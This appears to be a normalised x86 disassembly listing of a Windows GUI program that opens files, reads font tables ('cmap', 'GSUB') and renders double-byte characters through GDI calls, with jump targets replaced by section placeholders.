lea eax [ ebp + 0xac ]
push eax
mov [ esp + 0x34 ] ebp
call sub_429490
push j_sub_420470
push sub_401590
push 0xc
push 0x4
lea ecx [ ebp + 0xc0 ]
xor esi esi
push ecx
mov [ esp + 0x884 ] esi
call sub_429490
mov ebx [ esp + 0x878 ]
xor eax eax
cmp ebx esi
mov ecx 0x3c
mov edi ebp
mov [ esp + 0x870 ] 0x1
mov [ esp + 0x10 ] esi
mov [ esp + 0x14 ] 0x1
[ edi ]
jne r-xdata
push ebx
mov [ ebp + 0xc ] 0x41
call sub_431a26
mov [ ebp + 0x90 ] eax
mov edx [ rw-data ]
add esp 0x4
mov [ ebp + 0x8 ] edx
lea edi [ ebp + 0x94 ]
mov ecx 0x5
mov esi rw-data
[ edi ] [ esi ]
push 0x0
mov ecx ebp
call sub_425020
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push ebx
call [ CreateFileA@IAT ]
mov ebx [ esp + 0x87c ]
test ebx ebx
mov esi eax
je r-xdata
mov ax [ rw-data ]
inc ax
movsx edx ax
push edx
mov [ rw-data ] ax
lea eax [ esp + 0x74 ]
push 0x50
push eax
call sub_420b10
lea ecx [ esp + 0x7c ]
add esp 0xc
mov [ esp + 0x878 ] ecx
mov ebx ecx
cmp ebx 0x1
jne r-xdata
cmp esi 0xffffffff
je r-xdata
push 0x0
mov ecx ebp
call sub_421980
test eax eax
je r-xdata
mov ebx 0x4
cmp ebx 0x1
jne r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax [ esp + 0x10 ]
dec eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_420ef0
add esp 0x4
mov [ esp + 0x10 ] 0x1
mov edi [ SetFilePointer@IAT ]
mov eax [ ebp + 0x90 ]
push eax
call [ lstrlenA@IAT ]
mov ecx [ ebp + 0x90 ]
push 0x0
lea edx [ esp + 0x20 ]
push edx
lea edi [ eax + ecx - 0x4 ]
push 0x4
lea eax [ esp + 0x24 ]
push eax
push esi
call [ ReadFile@IAT ]
mov eax [ esp + 0x18 ]
cmp eax 0x42022667
jne r-xdata
mov edx [ esp + 0x878 ]
mov eax [ rw-data ]
push edx
push 0x10
push 0x52
push 0x51
push eax
call sub_420e20
add esp 0x14
dec eax
jne r-xdata
cmp ebx 0x4
je r-xdata
push esi
push 0x7d0
lea edx [ esp + 0xa0 ]
push edx
lea ecx [ esp + 0x30 ]
call sub_4010b0
push 0x1
lea ecx [ esp + 0x28 ]
call sub_419030
lea ecx [ esp + 0x24 ]
call sub_418ed0
test eax eax
jne r-xdata
cmp eax 0xbe72c536
jne r-xdata
push r--data
push edi
call sub_431aa6
add esp 0x8
mov ebx eax
neg ebx
sbb ebx ebx
add ebx 0x5
jmp r-xdata
mov ax [ rw-data ]
test ax ax
je r-xdata
mov edx [ esp + 0x878 ]
mov eax [ rw-data ]
push edx
push 0x14
push 0x52
push 0x63
push eax
call sub_420e20
add esp 0x14
cmp eax 0x6
jne r-xdata
push esi
push 0x7d0
lea edx [ esp + 0xa0 ]
push edx
lea ecx [ esp + 0x5c ]
call sub_4010b0
lea eax [ esp + 0x50 ]
push eax
mov ecx ebp
call sub_411750
mov [ esp + 0x10 ] eax
jmp r-xdata
cmp ebx 0x5
je r-xdata
push 0x0
push 0x0
push 0x0
push esi
call edi
mov ebx 0x2e
push r--data
push edi
call sub_431aa6
add esp 0x8
test eax eax
jne r-xdata
mov ebx 0xf
jmp r-xdata
mov edi [ SetFilePointer@IAT ]
push 0x0
push 0x0
push 0x0
push esi
call edi
cmp ebx 0x1
jne r-xdata
xor eax eax
movsx eax ax
jmp r-xdata
mov ecx ebp
call sub_40e960
push ebp
call j_sub_429931
push esi
push 0x7d0
lea eax [ esp + 0xa0 ]
push eax
lea ecx [ esp + 0x30 ]
call sub_4010b0
push ebx
lea ecx [ esp + 0x28 ]
call sub_419030
lea ecx [ esp + 0x24 ]
push ecx
mov ecx ebp
call sub_4115c0
cmp ebx 0x2e
mov [ esp + 0x10 ] eax
jne r-xdata
push r--data
push edi
call sub_431aa6
add esp 0x8
test eax eax
jne r-xdata
mov ebx 0xe
jmp r-xdata
cmp ebx 0xe
jne r-xdata
push esi
push 0x7d0
lea ecx [ esp + 0xa0 ]
push ecx
lea ecx [ esp + 0x30 ]
call sub_4010b0
push ebx
lea ecx [ esp + 0x28 ]
call sub_419030
lea ecx [ esp + 0x24 ]
call sub_419090
mov ebx eax
cmp [ esp + 0x14 ] 0xd
jne r-xdata
mov [ ebp + 0x4 ] eax
mov ecx [ rw-data ]
mov edx [ ecx ]
mov [ ebp ] edx
mov eax [ rw-data ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] ebp
mov edx [ rw-data ]
mov [ edx ] ebp
mov [ ebp + 0x4 ] ebp
mov [ ebp ] ebp
jmp r-xdata
mov [ ebp + 0x7e ] ax
mov eax [ ebp + 0x4c ]
mov [ ebp + 0x68 ] eax
mov [ ebp + 0x54 ] eax
mov eax [ eax + 0x8 ]
mov [ ebp + 0x6c ] eax
mov [ ebp + 0x58 ] eax
mov [ ebp + 0x48 ] 0x0
mov [ ebp + 0xc ] bl
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ebx 0xe
jmp r-xdata
push r--data
push edi
call sub_431aa6
add esp 0x8
test eax eax
jne r-xdata
mov ebx 0x6
jmp r-xdata
push 0x0
push 0x0
push 0x0
push esi
call edi
jmp r-xdata
cmp ebx 0xc
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x878 ]
push eax
mov ecx ebp
call sub_412500
jmp r-xdata
cmp ebx 0xf
mov [ rw-data ] ebp
jne r-xdata
push r--data
push edi
call sub_431aa6
add esp 0x8
test eax eax
jne r-xdata
mov ebx 0x7
jmp r-xdata
mov ebx 0xd
mov ecx ebp
call sub_4113e0
mov al [ ebp + 0xc ]
test al al
je r-xdata
mov ecx ebp
call sub_40eea0
mov ecx [ esp + 0x868 ]
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x864
retn 0xc
push r--data
push edi
call sub_431aa6
add esp 0x8
test eax eax
jne r-xdata
mov ebx 0x8
jmp r-xdata
mov eax [ esp + 0x880 ]
test eax eax
je r-xdata
push r--data
push edi
call sub_431aa6
add esp 0x8
test eax eax
jne r-xdata
mov ebx 0x9
jmp r-xdata
mov ecx [ ebp + 0x90 ]
push ecx
call sub_4112f0
jmp r-xdata
push r--data
push edi
call sub_431aa6
add esp 0x8
test eax eax
jne r-xdata
mov ebx 0xa
jmp r-xdata
add esp 0x4
mov [ esp + 0x14 ] 0xd
sub_412bb0
push 0xffffffff
push sub_431d6b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov al [ esi + 0x48 ]
test al al
je r-xdata
push edi
push 0xf0
call sub_42991a
add esp 0x4
mov [ esp + 0x8 ] eax
test eax eax
mov [ esp + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x90 ]
push eax
push 0x5d
call sub_420f70
add esp 0x8
test eax eax
je r-xdata
xor edi edi
movzx ecx [ esi + 0xc ]
mov edx [ esi + 0x90 ]
push 0x1
push ecx
push edx
mov ecx eax
call sub_4126f0
mov edi eax
jmp r-xdata
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
pop edi
mov ecx esi
call sub_4113e0
push 0x0
mov ecx esi
mov [ esi + 0x48 ] 0x0
call sub_4123c0
mov ecx edi
call sub_4113e0
test edi edi
mov [ esp + 0x14 ] 0xffffffff
je r-xdata
sub_412c60
push 0xffffffff
push sub_431d6b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
call sub_411fa0
mov esi eax
add esp 0x4
test esi esi
je r-xdata
push 0xf0
call sub_42991a
add esp 0x4
mov [ esp + 0x4 ] eax
test eax eax
mov [ esp + 0x10 ] 0x0
je r-xdata
movzx eax [ rw-data ]
cmp eax 0x2
jne r-xdata
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ esp + 0x18 ]
push 0x1
push ecx
push edi
mov ecx eax
call sub_4126f0
cmp eax 0x1
jne r-xdata
push 0x805
push edi
push 0x389
push 0x0
call sub_4214f0
add esp 0x10
dec eax
je r-xdata
mov ecx esi
call sub_4113e0
pop esi
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
dec eax
je r-xdata
sub eax 0x6b7
jne r-xdata
mov ecx esi
call sub_4113e0
mov ecx esi
call sub_412bb0
pop esi
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_412d30
sub esp 0x200
push ebx
mov ebx [ esp + 0x208 ]
push ebp
mov ebp [ DragQueryFileA@IAT ]
push esi
push 0x200
lea eax [ esp + 0x10 ]
push eax
xor esi esi
push esi
push ebx
call ebp
test eax eax
jbe r-xdata
push ebx
call [ DragFinish@IAT ]
pop esi
pop ebp
pop ebx
add esp 0x200
retn
push edi
jmp r-xdata
push 0x1
lea edi [ esp + 0x14 ]
call sub_412c60
add esp 0x4
push 0x200
lea ecx [ esp + 0x14 ]
push ecx
inc esi
push esi
push ebx
call ebp
test eax eax
ja r-xdata
pop edi
sub_412da0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x638
push ebx
push ebp
push esi
push edi
xor eax eax
mov ecx 0x13
lea edi [ esp + 0x10 ]
[ edi ]
mov ecx 0xfa
lea edi [ esp + 0x260 ]
[ edi ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
push 0x61
push 0x62
mov ebx 0x1
mov [ esp + 0x18 ] 0x4c
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] ecx
call sub_420f10
mov [ esp + 0x24 ] eax
add esp 0x8
lea eax [ esp + 0x10 ]
lea edx [ esp + 0x260 ]
push eax
mov [ esp + 0x2c ] 0x2
mov [ esp + 0x30 ] edx
mov [ esp + 0x34 ] 0x3e8
mov [ esp + 0x48 ] 0x82a04
call [ GetOpenFileNameA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
mov esp ebp
pop ebp
retn
mov ebp [ esp + 0x28 ]
cmp ebp 0x2
jne r-xdata
lea ecx [ esp + 0x260 ]
push ecx
call [ lstrlenA@IAT ]
lea esi [ esp + eax + 0x261 ]
lea ecx [ ecx ]
mov ebp ebx
lea edx [ esp + 0x260 ]
push edx
lea eax [ esp + 0x64 ]
push eax
xor ebx ebx
call [ lstrcpyA@IAT ]
lea ecx [ esp + 0x60 ]
push esi
push ecx
call sub_420a00
push ebp
lea edi [ esp + 0x6c ]
mov esi eax
call sub_412c60
add esp 0xc
jmp r-xdata
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
sub_412ea0
mov ecx [ esp + 0x4 ]
mov edx [ rw-data ]
sub esp 0x200
push edi
lea eax [ esp + 0x4 ]
push eax
push 0x0
push ecx
push edx
call sub_420fe0
push 0x1
lea edi [ esp + 0x1b ]
call sub_412c60
add esp 0x14
pop edi
add esp 0x200
retn
sub_412ee0
xor eax eax
test ecx ecx
push edi
jle r-xdata
xor eax eax
movzx edi [ edx + eax * 2 ]
inc eax
cmp esi edi
je r-xdata
pop edi
retn
cmp eax ecx
jl r-xdata
sub_412f20
push esi
mov esi ecx
mov eax [ esi + 0x18 ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov eax [ esi + 0x24 ]
cmp eax edi
je r-xdata
push eax
call sub_429931
add esp 0x4
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
push eax
call [ DeleteDC@IAT ]
mov eax [ esi + 0x28 ]
cmp eax 0xffffffff
je r-xdata
push eax
call sub_429931
add esp 0x4
mov eax [ esi + 0x2c ]
cmp eax edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] 0xffffffff
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ esi + 0x2c ] edi
pop edi
pop esi
retn
push eax
call [ DeleteObject@IAT ]
sub_412f90
mov edx [ esp + 0x4 ]
mov eax edx
movzx edx dl
shr eax 0x8
cmp edx 0x20
movzx eax al
jle r-xdata
mov edx [ ecx ]
mov [ esp + 0x4 ] 0x2223
jmp [ edx + 0x8 ]
cmp edx 0x7f
jge r-xdata
cmp eax 0x20
jle r-xdata
cmp eax 0x75
jge r-xdata
cmp eax 0x74
jne r-xdata
imul eax eax 0x5e
cmp [ ecx + 0x10 ] 0x0
lea eax [ eax + edx - 0xc3f ]
jne r-xdata
cmp edx 0x24
jg r-xdata
retn 0x4
cmp eax 0x6b
jle r-xdata
cmp eax 0xcb
jl r-xdata
cmp eax 0xdc
jl r-xdata
cmp eax 0xd4
jg r-xdata
cmp eax 0xfc
jl r-xdata
cmp eax 0xf5
jg r-xdata
add eax 0xffffffc8
cmp eax 0x11a
jl r-xdata
cmp eax 0x115
jg r-xdata
add eax 0xffffffc1
retn 0x4
cmp eax 0x178
jl r-xdata
cmp eax 0x16c
jg r-xdata
add eax 0xffffffbb
retn 0x4
cmp eax 0x1d6
jl r-xdata
cmp eax 0x1cd
jg r-xdata
add eax 0xffffffb7
retn 0x4
cmp eax 0x1f6
jl r-xdata
cmp eax 0x1ed
jg r-xdata
add eax 0xffffffac
retn 0x4
cmp eax 0x234
jl r-xdata
cmp eax 0x20d
jg r-xdata
add eax 0xffffffa4
retn 0x4
cmp eax 0x264
jl r-xdata
cmp eax 0x254
jg r-xdata
add eax 0xffffff9c
retn 0x4
cmp eax 0x582
jl r-xdata
cmp eax 0x284
jg r-xdata
add eax 0xffffff76
retn 0x4
cmp eax 0x1142
jl r-xdata
cmp eax 0x1116
jg r-xdata
add eax 0xffffff67
retn 0x4
cmp eax 0x1e7d
jg r-xdata
add eax 0xfffffc8a
retn 0x4
add eax 0xfffffc60
retn 0x4
sub_4130e0
mov eax [ esp + 0x4 ]
sub esp 0x40
push esi
push 0x0
push 0x0
mov esi ecx
push eax
mov ecx rw-data
call sub_425b30
cmp eax 0xffffffff
mov [ esi + 0x28 ] eax
je r-xdata
mov eax 0x1
pop esi
add esp 0x40
retn 0xc
push 0x0
lea ecx [ esp + 0x4c ]
push ecx
push 0x40
lea edx [ esp + 0x10 ]
push edx
push eax
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov al [ esp + 0x50 ]
mov [ esi + 0xd ] al
mov ax [ esp + 0x2c ]
mov ecx [ esp + 0x2e ]
mov [ esi + 0x4 ] ax
movsx eax ax
cdq
and edx 0x7
add eax edx
sar eax 0x3
inc eax
mov dx [ esp + 0x38 ]
shr eax 0x1
imul eax ecx
shl eax 0x1
mov [ esi + 0x14 ] ax
mov ax [ esp + 0x3a ]
mov [ esi + 0x8 ] ax
movsx eax [ esp + 0x3c ]
mov [ esi + 0x10 ] dx
cdq
sub eax edx
sar eax 0x1
mov [ esi + 0xa ] ax
movsx eax ax
push ebx
push ebp
mov [ esi + 0x6 ] cx
mov cx [ esp + 0x38 ]
cdq
push edi
mov di [ esi + 0x14 ]
mov [ esi + 0x16 ] cx
mov ecx [ esi + 0x28 ]
sub eax edx
push 0x0
sar eax 0x1
push ecx
mov [ esi + 0xc ] 0x0
mov [ esi + 0x12 ] ax
movsx ebp di
call [ GetFileSize@IAT ]
sub eax 0x40
xor edx edx
div ebp
cmp di [ esi + 0x16 ]
mov ebx eax
jne r-xdata
movsx edx [ rw-data ]
push 0x2
push edx
call sub_429969
mov [ esi + 0x1c ] eax
movsx eax [ esi + 0x14 ]
movsx ecx [ rw-data ]
push eax
push ecx
call sub_429969
mov ecx [ esi + 0x1c ]
add esp 0x10
test ecx ecx
mov [ esi + 0x18 ] eax
je r-xdata
mov eax [ esp + 0x58 ]
test eax eax
je r-xdata
pop edi
pop ebp
pop ebx
mov eax 0x1
pop esi
add esp 0x40
retn 0xc
test eax eax
je r-xdata
push ebp
push ebx
call sub_429969
add esp 0x8
test eax eax
mov [ esi + 0x18 ] eax
je r-xdata
mov [ esi + 0x20 ] 0x0
jmp r-xdata
movsx ecx [ esi + 0x14 ]
imul ecx ebx
push 0x0
lea edx [ esp + 0x58 ]
push edx
mov edx [ esi + 0x28 ]
push ecx
push eax
push edx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov ecx [ esi + 0x18 ]
movsx edx [ esi + 0x6 ]
movsx eax [ esi + 0x4 ]
push ecx
push 0x1
push 0x1
push edx
push eax
call [ CreateBitmap@IAT ]
test eax eax
mov [ esi + 0x2c ] eax
je r-xdata
mov eax [ esi + 0x28 ]
push eax
call [ CloseHandle@IAT ]
mov [ esi + 0x28 ] 0xffffffff
mov ecx [ rw-data ]
push ecx
call [ GetDC@IAT ]
mov edi eax
push edi
call [ CreateCompatibleDC@IAT ]
mov edx [ esi + 0x2c ]
push edx
push eax
mov [ esi + 0x24 ] eax
call [ SelectObject@IAT ]
mov eax [ rw-data ]
push edi
push eax
call [ ReleaseDC@IAT ]
pop edi
pop ebp
pop ebx
xor eax eax
pop esi
add esp 0x40
retn 0xc
sub_4132b0
mov ecx [ esp + 0x4 ]
mov al [ esp + 0x4 ]
mov [ esp + 0x7 ] al
shr ecx 0x18
mov [ esp + 0x4 ] cl
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x4 ]
shr eax 0x8
shr edx 0x10
mov [ esp + 0x5 ] dl
mov [ esp + 0x6 ] al
mov eax [ esp + 0x4 ]
retn
sub_413320
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov eax [ esi + 0x18 ]
cmp eax edi
mov [ esi + 0x10 ] edi
je r-xdata
push eax
call [ DeleteObject@IAT ]
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
push eax
call sub_429931
add esp 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
pop edi
pop esi
retn
push eax
call sub_429931
add esp 0x4
sub_413360
movsx edx [ ecx + 0x6 ]
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x1c ]
mov esi [ edi + 0xc ]
mov ebx [ edi ]
mov eax esi
sub eax edx
sub eax [ edi + 0x4 ]
inc eax
cdq
sub eax edx
movsx edx [ ecx + 0x4 ]
sar eax 0x1
sub esi eax
mov eax [ edi + 0x8 ]
sub eax edx
mov ebp [ ecx ]
sub eax ebx
inc eax
cdq
sub eax edx
movsx edx [ ecx + 0x14 ]
sar eax 0x1
sub eax edx
mov edx [ esp + 0x14 ]
push esi
add eax ebx
push eax
mov eax [ esp + 0x20 ]
push eax
push edx
call [ ebp ]
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
sub_4133c0
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
push eax
mov esi ecx
call sub_418730
movzx edx [ esi + 0x20 ]
add esp 0x4
xor ecx ecx
test edx edx
jle r-xdata
mov edx [ esi + 0x24 ]
movzx ebx [ edx + ecx * 2 ]
cmp eax ebx
jge r-xdata
mov edi [ esi + 0x28 ]
nop
mov edx [ esi + 0x30 ]
mov di [ edx + ecx * 2 ]
test di di
jne r-xdata
mov eax [ esi ]
push 0x2223
mov ecx esi
call [ eax + 0x8 ]
pop edi
pop esi
pop ebx
retn 0x4
inc ecx
add edi 0x2
cmp ecx edx
jl r-xdata
movzx edi di
shr edi 0x1
sub edi ebx
add edi ecx
add edi eax
movzx eax [ edx + edi * 2 ]
mov edx [ esi + 0x2c ]
movzx ecx [ edx + ecx * 2 ]
add eax ecx
jmp r-xdata
movzx ebx [ edi ]
cmp eax ebx
jle r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov edx [ esi ]
push 0x2223
mov ecx esi
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn 0x4
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
movzx edi [ esi + 0x38 ]
xor ecx ecx
test edi edi
jle r-xdata
mov edx [ esi + 0x3c ]
movzx edx [ edx + ecx * 2 ]
cmp edx eax
jne r-xdata
mov edx [ esi + 0x3c ]
lea esp [ esp ]
mov eax [ esi + 0x40 ]
movzx eax [ eax + ecx * 2 ]
inc ecx
add edx 0x2
cmp ecx edi
jl r-xdata
movzx ebx [ edx ]
cmp ebx eax
jge r-xdata
sub_413490
sub esp 0x74
push ebx
push esi
push edi
mov esi ecx
xor eax eax
mov ecx 0xf
lea edi [ esp + 0x44 ]
[ edi ]
mov eax [ esp + 0x88 ]
push eax
lea ecx [ esp + 0x64 ]
push ecx
call [ lstrcpyA@IAT ]
mov edi [ esp + 0x8c ]
mov ebx [ esp + 0x90 ]
mov edx edi
neg edx
mov eax ebx
neg eax
sbb eax eax
and eax 0x384
mov [ esp + 0x50 ] eax
mov [ esp + 0x4c ] eax
lea eax [ esp + 0x44 ]
push eax
mov [ esp + 0x48 ] edx
mov [ esp + 0x5f ] 0x80
call [ CreateFontIndirectA@IAT ]
test eax eax
mov [ esi + 0x10 ] eax
jne r-xdata
mov [ esi + 0xd ] bl
mov ebx [ esp + 0x84 ]
push eax
push ebx
mov [ esi + 0xc ] 0x1
call [ SelectObject@IAT ]
lea ecx [ esp + 0xc ]
push ecx
push ebx
mov [ esi + 0x10 ] eax
call [ GetTextMetricsA@IAT ]
mov eax [ esp + 0x24 ]
cmp ax di
mov [ esi + 0x6 ] di
mov [ esi + 0x4 ] ax
jle r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x74
retn 0x10
movsx ecx [ esi + 0x4 ]
movsx eax di
cdq
and edx 0x7
add eax edx
sar eax 0x3
mov [ esi + 0x8 ] ax
mov eax 0x2aaaaaab
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
push ebp
mov ebp [ GetFontData@IAT ]
movsx eax dx
push 0x0
mov [ esi + 0xa ] dx
cdq
push 0x0
sub eax edx
push 0x0
sar eax 0x1
push 0x70616d63
dec eax
neg edi
push ebx
mov [ esi + 0x14 ] ax
mov [ esi + 0x16 ] di
call ebp
mov edi eax
push edi
call sub_429a56
add esp 0x4
test eax eax
mov [ esi + 0x18 ] eax
jne r-xdata
mov [ esi + 0x4 ] di
push edi
push eax
push 0x0
push 0x70616d63
push ebx
call ebp
cmp eax 0xffffffff
je r-xdata
pop ebp
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x74
retn 0x10
mov edi [ esi + 0x18 ]
xor ecx ecx
mov cx [ edi + 0x2 ]
push ecx
call sub_4132e0
movzx ebp ax
add esp 0x4
xor edx edx
test ebp ebp
jle r-xdata
lea ecx [ ecx ]
inc edx
cmp edx ebp
jl r-xdata
xor ecx ecx
mov cx [ edi + edx * 8 + 0x6 ]
push ecx
call sub_4132e0
add esp 0x4
cmp ax 0x1
je r-xdata
xor eax eax
mov ax [ edi + edx * 8 + 0x4 ]
push eax
call sub_4132e0
add esp 0x4
cmp ax 0x3
jne r-xdata
pop ebp
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x74
retn 0x10
cmp edx ebp
jge r-xdata
mov edx [ edi + edx * 8 + 0x8 ]
push edx
call sub_4132b0
mov edx eax
xor eax eax
mov ax [ edx + edi ]
add edx edi
push eax
call sub_4132e0
add esp 0x8
cmp ax 0x4
jne r-xdata
xor ecx ecx
mov cx [ edx + 0x6 ]
push ecx
call sub_4132e0
shr ax 0x1
mov [ esi + 0x20 ] ax
movzx eax ax
shl eax 0x1
lea ecx [ edx + 0xe ]
mov [ esi + 0x28 ] ecx
lea ecx [ eax + ecx + 0x2 ]
mov [ esi + 0x24 ] ecx
add ecx eax
mov [ esi + 0x2c ] ecx
add ecx eax
mov [ esi + 0x30 ] ecx
add ecx eax
xor eax eax
mov [ esi + 0x34 ] ecx
mov ax [ edx + 0x2 ]
push eax
call sub_4132e0
movzx edi ax
shr edi 0x1
add esp 0x8
xor ebp ebp
test edi edi
jle r-xdata
mov eax [ esp + 0x94 ]
test eax eax
je r-xdata
lea ecx [ ecx ]
mov ecx [ esi + 0x10 ]
push ecx
push ebx
call [ SelectObject@IAT ]
pop ebp
pop edi
mov [ esi + 0x10 ] eax
pop esi
xor eax eax
pop ebx
add esp 0x74
retn 0x10
mov ebp [ GetFontData@IAT ]
push 0x0
push 0x0
push 0x0
push 0x42555347
push ebx
call ebp
mov edi eax
push edi
call sub_429a56
add esp 0x4
test eax eax
mov [ esi + 0x1c ] eax
je r-xdata
xor ecx ecx
mov cx [ edx + ebp * 2 ]
push ecx
call sub_4132e0
add esp 0x4
mov [ edx + ebp * 2 ] ax
inc ebp
cmp ebp edi
jl r-xdata
push edi
push eax
push 0x0
push 0x42555347
push ebx
call ebp
mov ebp [ esi + 0x1c ]
xor edx edx
mov dx [ ebp + 0x6 ]
push edx
call sub_4132e0
movzx edx ax
xor eax eax
mov ax [ edx + ebp ]
add edx ebp
push eax
call sub_4132e0
movzx eax ax
add esp 0x8
xor ebx ebx
test eax eax
jle r-xdata
lea ecx [ edx + 0x2 ]
cmp ebx eax
jge r-xdata
inc ebx
add ecx 0x6
cmp ebx eax
jl r-xdata
xor ecx ecx
mov cx [ ebp + 0x8 ]
push ecx
call sub_4132e0
movzx edi ax
lea eax [ ebx + ebx * 2 + 0x3 ]
xor ecx ecx
mov cx [ edx + eax * 2 ]
add edi ebp
push ecx
call sub_4132e0
movzx eax ax
xor ecx ecx
mov cx [ eax + edx + 0x4 ]
push ecx
call sub_4132e0
movzx edx ax
xor eax eax
mov ax [ edi + edx * 2 + 0x2 ]
push eax
call sub_4132e0
movzx ebx ax
xor ecx ecx
mov cx [ ebx + edi + 0x6 ]
add ebx edi
push ecx
call sub_4132e0
movzx edx ax
xor eax eax
mov ax [ edx + ebx + 0x2 ]
add edx ebx
push eax
call sub_4132e0
movzx edi ax
xor ecx ecx
mov cx [ edi + edx + 0x2 ]
add edi edx
push ecx
call sub_4132e0
add edx 0x6
add edi 0x4
mov [ esi + 0x40 ] edx
add esp 0x1c
xor edx edx
test ax ax
mov [ esi + 0x38 ] ax
mov [ esi + 0x3c ] edi
jbe r-xdata
cmp [ ecx ] 0x74726576
je r-xdata
pop ebp
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x74
retn 0x10
mov ebx [ esp + 0x88 ]
mov [ esi + 0x16 ] 0x0
mov eax [ esi + 0x3c ]
lea edi [ eax + edx * 2 ]
xor ecx ecx
mov cx [ edi ]
push ecx
call sub_4132e0
mov [ edi ] ax
mov eax [ esi + 0x40 ]
lea edi [ eax + edx * 2 ]
xor ecx ecx
mov cx [ edi ]
push ecx
call sub_4132e0
mov [ edi ] ax
movzx eax [ esi + 0x38 ]
add esp 0x8
inc edx
cmp edx eax
jl r-xdata
sub_413850
push ebx
push esi
mov esi ecx
mov al [ esi + 0x18 ]
xor ebx ebx
cmp al bl
jne r-xdata
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
pop esi
pop ebx
retn
mov ecx [ esi + 0x20 ]
call sub_412f00
mov eax [ esi + 0x1c ]
cmp eax ebx
je r-xdata
push eax
call [ DeleteObject@IAT ]
sub_4138a0
mov eax [ esp + 0x8 ]
test ah 0x7f
je r-xdata
cmp eax 0x9
je r-xdata
movsx eax [ ecx + 0x2 ]
add eax [ esp + 0x4 ]
retn 0x8
mov eax [ esp + 0x4 ]
push esi
movsx esi [ ecx + 0x12 ]
movsx ecx [ ecx + 0x2 ]
sub eax esi
cdq
idiv ecx
inc eax
imul eax ecx
add eax esi
pop esi
retn 0x8
movsx eax [ ecx + eax * 2 + 0x24 ]
add eax [ esp + 0x4 ]
retn 0x8
sub_4138f0
sub esp 0x3c
push esi
push edi
mov esi ecx
xor eax eax
mov ecx 0xf
lea edi [ esp + 0x8 ]
[ edi ]
mov eax [ esp + 0x48 ]
push eax
lea ecx [ esp + 0x28 ]
push ecx
call [ lstrcpyA@IAT ]
movsx edx [ esi ]
lea eax [ esp + 0x8 ]
neg edx
push eax
mov [ esp + 0xc ] edx
call [ CreateFontIndirectA@IAT ]
pop edi
pop esi
add esp 0x3c
retn 0x4
sub_413930
mov eax 0xae4c415d
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
push esi
mov esi edx
imul esi esi 0x5e
mov eax ecx
sub eax esi
shl edx 0x8
or eax edx
add eax 0x3021
pop esi
retn
sub_413a00
push ecx
push esi
push edi
mov edi ecx
xor esi esi
inc esi
cmp esi 0x1932
jle r-xdata
mov ecx esi
call sub_413930
mov ecx [ rw-data ]
mov [ esp + 0x8 ] eax
push 0x1
lea eax [ esp + 0xc ]
push eax
call sub_40ee50
cmp [ esi + edi ] 0x0
je r-xdata
pop edi
pop esi
pop ecx
retn
sub_413a40
sub esp 0x8
push ebx
push esi
push 0x1
push 0x0
mov ebx ecx
push r--data
mov ecx rw-data
call sub_425b30
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
call [ CloseHandle@IAT ]
pop esi
pop ebx
add esp 0x8
retn
push edi
mov edi [ ReadFile@IAT ]
push 0x0
lea eax [ esp + 0x14 ]
push eax
push 0x2
lea ecx [ esp + 0x18 ]
push ecx
push esi
call edi
cmp [ esp + 0x10 ] 0x2
jne r-xdata
pop edi
mov eax [ esp + 0xc ]
movzx dx ah
mov dh al
mov ecx ebx
mov eax edx
mov [ esp + 0xc ] eax
and eax 0x7f7f
push eax
call sub_413990
push 0x0
lea eax [ esp + 0x14 ]
push eax
push 0x2
lea ecx [ esp + 0x18 ]
push ecx
push esi
call edi
cmp [ esp + 0x10 ] 0x2
je r-xdata
sub_413af0
sub esp 0x8
push ebp
push edi
push 0x1
push 0x3
mov ebp ecx
push r--data
mov ecx rw-data
call sub_425b30
mov edi eax
